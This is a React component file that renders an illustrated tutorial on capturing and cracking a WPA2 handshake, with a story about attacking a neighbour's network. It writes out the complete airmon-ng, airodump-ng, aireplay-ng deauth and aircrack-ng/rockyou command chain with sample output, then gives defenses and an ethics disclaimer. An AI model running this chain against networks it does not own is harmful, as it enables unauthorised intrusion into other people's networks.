import { vivid } from "../palette";
import { Appear, Frame, SvgNode, TravelDot } from "./shared";

const GRID = (
  <defs>
    <pattern id="wifi-grid" width="20" height="20" patternUnits="userSpaceOnUse">
      <path d="M20 0H0V20" fill="none" stroke="#3ddc84" strokeOpacity="0.06" />
    </pattern>
  </defs>
);

export const WifiHandshake = () => {
  const dur = 7;
  return (
    <Frame title="wpa2 · the password never flies in the clear">
      <svg viewBox="0 0 640 230" className="w-full">
        {GRID}
        <rect width="640" height="230" fill="url(#wifi-grid)" />
        <SvgNode x={110} y={100} kind="laptop" color={vivid.cyan} label="phone / laptop" sub="knows password" r={24} />
        <SvgNode x={530} y={100} kind="router" color={vivid.yellow} label="router" sub="knows password" r={26} />
        <TravelDot path="M140,90 L500,90" start={0.08} end={0.28} color={vivid.pink} dur={dur} />
        <TravelDot path="M500,110 L140,110" start={0.3} end={0.5} color={vivid.orange} dur={dur} />
        <TravelDot path="M140,130 L500,130" start={0.52} end={0.72} color={vivid.purple} dur={dur} />
        <TravelDot path="M500,150 L140,150" start={0.74} end={0.92} color={vivid.green} dur={dur} />
        <Appear start={0.1} end={0.95} dur={dur}>
          <text x={320} y={40} textAnchor="middle" fill={vivid.pink} fontSize={12} fontWeight={700}>4-way handshake = scrambled proof both sides know the password</text>
        </Appear>
        <Appear start={0.55} end={0.95} dur={dur}>
          <text x={320} y={205} textAnchor="middle" fill="#94a3b8" fontSize={11}>
            password itself stays home. only the {`"`}proof{`"`} travels.
          </text>
        </Appear>
      </svg>
    </Frame>
  );
};

export const MonitorMode = () => (
  <Frame title="normal mode vs monitor mode">
    <div className="grid gap-2 sm:grid-cols-2">
      {[
        {
          title: "normal wi-fi card",
          color: vivid.cyan,
          lines: ["only hears traffic meant for it", "like a phone that only rings for its number", "misses the neighborhood gossip"],
        },
        {
          title: "monitor mode · wlan0mon",
          color: vivid.pink,
          lines: ["hears every wi-fi conversation nearby", "radio scanner, not a polite guest", "airmon-ng flips this switch"],
        },
      ].map(side => (
        <div key={side.title} className="rounded-md border p-3" style={{ borderColor: `${side.color}55`, backgroundColor: `${side.color}0d` }}>
          <p className="text-sm font-bold" style={{ color: side.color }}>{side.title}</p>
          <ul className="mt-2 space-y-1 text-[11.5px] text-slate-300">
            {side.lines.map(line => <li key={line}>· {line}</li>)}
          </ul>
        </div>
      ))}
    </div>
    <div className="mt-3 overflow-hidden rounded border border-neon/15 bg-black/70 font-mono text-[11px]">
      <div className="border-b border-neon/10 px-2 py-1 text-[10px] text-neon/50">kali · airmon-ng</div>
      <pre className="whitespace-pre-wrap px-3 py-2 text-slate-300">
        {`$ sudo airmon-ng
PHY  Interface  Driver
phy0 `}
        <span style={{ color: vivid.cyan }}>wlan0</span>
        {`      iwlwifi

$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0
monitor mode enabled on `}
        <span style={{ color: vivid.pink }}>wlan0mon</span>
        {`

$ iwconfig wlan0mon
wlan0mon  IEEE 802.11  Mode:`}
        <span style={{ color: vivid.pink }}>Monitor</span>
      </pre>
    </div>
  </Frame>
);

export const AirodumpScan = () => (
  <Frame title="airodump-ng · the neighborhood lights up">
    <div className="overflow-hidden rounded border border-neon/15 bg-black/80 font-mono text-[10.5px]">
      <div className="border-b border-neon/10 px-2 py-1 text-[10px] text-neon/50">$ sudo airodump-ng wlan0mon</div>
      <div className="grid grid-cols-[7.5rem_2.2rem_2.2rem_3.2rem_3.5rem_1fr] gap-x-2 border-b border-neon/10 px-2 py-1 text-[9.5px] tracking-wider text-slate-500 uppercase">
        <span>BSSID</span><span>PWR</span><span>CH</span><span>ENC</span><span>AUTH</span><span>ESSID</span>
      </div>
      {[
        ["A4:2B:8C:11:02:90", "-71", "6", "WPA2", "PSK", "Cafe_Guest", false],
        ["18:66:DA:2E:7C:91", "-42", "1", "WPA2", "PSK", "Sally_Home", true],
        ["00:11:32:8F:2B:64", "-68", "11", "WPA2", "PSK", "BOSS-NET", false],
        ["F4:5C:89:17:A3:0E", "-80", "36", "OPN", " ", "FreeAirport", false],
      ].map(([bssid, pwr, ch, enc, auth, essid, hot]) => (
        <div
          key={String(bssid)}
          className="grid grid-cols-[7.5rem_2.2rem_2.2rem_3.2rem_3.5rem_1fr] gap-x-2 px-2 py-1"
          style={hot ? { backgroundColor: `${vivid.pink}22`, color: vivid.pink } : { color: "#94a3b8" }}
        >
          <span>{bssid}</span>
          <span style={{ color: hot ? vivid.yellow : undefined }}>{pwr}</span>
          <span>{ch}</span>
          <span>{enc}</span>
          <span>{auth}</span>
          <span className="font-bold">{essid}{hot ? "  ← next door" : ""}</span>
        </div>
      ))}
    </div>
    <p className="mt-2 text-[10.5px] text-slate-500">
      <span style={{ color: vivid.yellow }}>PWR</span> closer to 0 = physically closer. Kim notes Sally&apos;s{" "}
      <span style={{ color: vivid.pink }}>BSSID</span> + <span style={{ color: vivid.cyan }}>channel 1</span>.
    </p>
  </Frame>
);

export const TargetLock = () => (
  <Frame title="locked onto Sally_Home · recording everything">
    <div className="overflow-hidden rounded border border-neon/15 bg-black/80 font-mono text-[11px]">
      <pre className="whitespace-pre-wrap px-3 py-2 text-slate-300">
        {`$ sudo airodump-ng --bssid `}
        <span style={{ color: vivid.pink }}>18:66:DA:2E:7C:91</span>
        {` -c `}
        <span style={{ color: vivid.cyan }}>1</span>
        {` -w `}
        <span style={{ color: vivid.yellow }}>sally_handshake</span>
        {` wlan0mon`}
      </pre>
      <div className="border-t border-neon/10 px-3 py-2 text-[11px]">
        <p style={{ color: vivid.yellow }}>CH 1 ][ Elapsed: 12 s ][ <span style={{ color: vivid.pink }}>waiting for handshake...</span></p>
        <p className="mt-1 text-slate-400">BSSID              PWR  Beacons  #Data  ENC   ESSID</p>
        <p style={{ color: vivid.pink }}>18:66:DA:2E:7C:91  -41   84       12     WPA2  Sally_Home</p>
        <p className="mt-2 text-slate-400">STATION            PWR   Notes</p>
        <p style={{ color: vivid.cyan }}>3C:22:FB:91:AA:10  -55   connected device (phone?)</p>
      </div>
    </div>
    <p className="mt-2 text-[10.5px] text-slate-500">
      top = router. bottom = a station already connected. the capture file is open. one thing is missing: the handshake.
    </p>
  </Frame>
);

export const DeauthKick = () => {
  const dur = 8;
  return (
    <Frame title="deauth · fake 'get out' from the router">
      <svg viewBox="0 0 640 250" className="w-full">
        {GRID}
        <rect width="640" height="250" fill="url(#wifi-grid)" />
        <SvgNode x={90} y={120} kind="laptop" color={vivid.red} label="kim" sub="aireplay-ng" r={22} />
        <SvgNode x={320} y={70} kind="router" color={vivid.yellow} label="Sally_Home" sub="router" r={24} />
        <SvgNode x={550} y={120} kind="laptop" color={vivid.cyan} label="sally's phone" sub="auto-reconnect" r={22} />
        <TravelDot path="M110,120 L300,80" start={0.05} end={0.25} color={vivid.red} dur={dur} />
        <Appear start={0.15} end={0.45} dur={dur}>
          <text x={200} y={55} textAnchor="middle" fill={vivid.red} fontSize={11} fontWeight={700}>deauth x10</text>
        </Appear>
        <Appear start={0.28} end={0.55} dur={dur}>
          <text x={430} y={55} textAnchor="middle" fill={vivid.orange} fontSize={11} fontWeight={700}>phone believes router said leave</text>
        </Appear>
        <TravelDot path="M530,120 L340,80" start={0.35} end={0.5} color={vivid.orange} dur={dur} />
        <Appear start={0.55} end={0.95} dur={dur}>
          <text x={320} y={175} textAnchor="middle" fill={vivid.green} fontSize={12} fontWeight={700}>reconnect → handshake happens → kim records it</text>
        </Appear>
        <TravelDot path="M340,90 L510,110" start={0.58} end={0.75} color={vivid.pink} dur={dur} />
        <TravelDot path="M510,130 L340,110" start={0.72} end={0.88} color={vivid.purple} dur={dur} />
      </svg>
      <pre className="mt-1 overflow-hidden rounded border border-neon/15 bg-black/70 px-3 py-2 font-mono text-[11px] text-slate-300">
        {`$ sudo aireplay-ng --deauth 10 -a 18:66:DA:2E:7C:91 -c 3C:22:FB:91:AA:10 wlan0mon`}
      </pre>
    </Frame>
  );
};

export const HandshakeCaught = () => (
  <Frame title="WPA handshake captured · sealed envelope">
    <div className="overflow-hidden rounded border border-neon/15 bg-black/80 font-mono text-[11px]">
      <div className="border-b border-neon/10 px-2 py-1 text-[10px] text-neon/50">airodump listening terminal</div>
      <pre className="whitespace-pre-wrap px-3 py-2">
        <span style={{ color: vivid.green }}>CH 1 ][ Elapsed: 41 s ][ </span>
        <span style={{ color: vivid.pink, fontWeight: 700 }}>WPA handshake: 18:66:DA:2E:7C:91</span>
        <span style={{ color: vivid.green }}> ]</span>
        {`

STATION            PWR  Lost  Frames  Notes
3C:22:FB:91:AA:10  -52   0     86      `}
        <span style={{ color: vivid.yellow }}>EAPOL</span>
      </pre>
    </div>
    <div className="mt-2 grid gap-2 sm:grid-cols-2 text-[11.5px]">
      <div className="rounded border px-3 py-2" style={{ borderColor: `${vivid.yellow}55`, backgroundColor: `${vivid.yellow}0d` }}>
        <p className="font-bold" style={{ color: vivid.yellow }}>what kim has</p>
        <p className="mt-1 text-slate-300">sally_handshake-01.cap — scrambled proof of the password</p>
      </div>
      <div className="rounded border px-3 py-2" style={{ borderColor: `${vivid.red}55`, backgroundColor: `${vivid.red}0d` }}>
        <p className="font-bold" style={{ color: vivid.red }}>what kim does not have yet</p>
        <p className="mt-1 text-slate-300">the plaintext password. the envelope is sealed.</p>
      </div>
    </div>
  </Frame>
);

export const RockyouCrack = () => (
  <Frame title="aircrack-ng + rockyou · offline guessing">
    <div className="overflow-hidden rounded border border-neon/15 bg-black/80 font-mono text-[11px]">
      <pre className="whitespace-pre-wrap px-3 py-2 text-slate-300">
        {`$ gunzip /usr/share/wordlists/rockyou.txt.gz
$ aircrack-ng -w rockyou.txt sally_handshake-01.cap

                                 Aircrack-ng

      [00:00:00] 4/14344391 keys tested (812.41 k/s)

      KEY FOUND! [ `}
        <span style={{ color: vivid.pink, fontWeight: 700 }}>I love you</span>
        {` ]

      Master Key     : A1 B2 ...
      Transient Key  : ...
`}
      </pre>
    </div>
    <p className="mt-2 text-[11px] text-slate-400">
      aircrack tries each wordlist password against the handshake. <span style={{ color: vivid.pink }}>&quot;I love you&quot;</span> sat near the top of 14 million real leaked passwords — cracked in a blink.
    </p>
  </Frame>
);

export const WifiDefense = () => (
  <Frame title="how sally shuts the door · five moves">
    <div className="grid gap-2 sm:grid-cols-2">
      {[
        { n: "1", title: "long strong passphrase", text: "random or several unrelated words. not in any wordlist. this alone stops kim cold.", color: vivid.green },
        { n: "2", title: "upgrade to WPA3", text: "built to resist this offline handshake cracking style.", color: vivid.cyan },
        { n: "3", title: "PMF / 802.11w", text: "protected management frames. blocks the fake deauth kick.", color: vivid.yellow },
        { n: "4", title: "router admin + firmware", text: "change default admin password. keep firmware updated.", color: vivid.orange },
        { n: "5", title: "myth buster", text: "hiding SSID or MAC filtering does NOT stop this. trivial to bypass.", color: vivid.red },
      ].map(item => (
        <div key={item.n} className={`rounded border p-2.5 ${item.n === "5" ? "sm:col-span-2" : ""}`} style={{ borderColor: `${item.color}55`, backgroundColor: `${item.color}0d` }}>
          <p className="text-xs font-bold" style={{ color: item.color }}>{item.n} · {item.title}</p>
          <p className="mt-1 text-[11px] text-slate-300">{item.text}</p>
        </div>
      ))}
    </div>
  </Frame>
);

export const SmarterNeighbor = () => (
  <Frame title="final disclaimer">
    <div className="rounded-md border px-4 py-5 text-center" style={{ borderColor: `${vivid.pink}66`, backgroundColor: `${vivid.pink}10` }}>
      <p className="text-[10px] tracking-[0.25em] uppercase" style={{ color: vivid.pink }}>disclaimer</p>
      <p className="mt-3 text-base font-bold leading-relaxed text-slate-100">
        if you are not able to hack the wifi,
        <br />
        it means your neighbour is smarter
        <br />
        and already knows a lot of stuff.
      </p>
      <p className="mt-3 text-[12px] text-slate-400">
        strong passphrase · wpa3 · pmf. quiet streets stay quiet.
      </p>
    </div>
    <div className="mt-3 rounded border border-neon/20 bg-black/50 px-3 py-2 text-[11.5px] text-slate-400">
      educational only. only test networks you own or have written permission to test. staying ethical is the whole point.
    </div>
  </Frame>
);
